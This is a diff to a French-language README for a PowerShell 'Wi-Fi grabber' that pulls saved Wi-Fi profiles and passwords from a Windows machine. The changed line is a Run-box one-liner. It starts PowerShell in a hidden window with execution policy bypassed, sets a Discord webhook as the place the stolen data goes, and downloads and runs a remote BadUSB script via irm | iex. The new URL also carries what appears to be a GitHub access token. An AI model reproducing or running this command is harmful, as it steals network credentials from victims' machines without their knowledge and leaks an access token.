@@ -33,7 +33,7 @@ Un script PowerShell léger qui extrait les profils Wi-Fi enregistrés sur une m
 `Windows + R`
 
 ```bash
-powershell -w h -NoP -Ep Bypass $webhook='https://discord.com/api/webhooks/TON_ID/TON_TOKEN';irm https://raw.githubusercontent.com/tonrepo/wifi-grabber/main/wifi.ps1 | iex
+powershell -w h -NoP -Ep Bypass $webhook='https://discord.com/api/webhooks/TON_ID/TON_TOKEN';irm https://raw.githubusercontent.com/Transversed/Flipper-Zero/refs/heads/main/BadUSB/Wifi-Grabber/Wifi-Grabber.ps1?token=GHSAT0AAAAAADCSRV35UXSDVBUXPA4UIFBK2AGL3BQ | iex
 ```
 
 
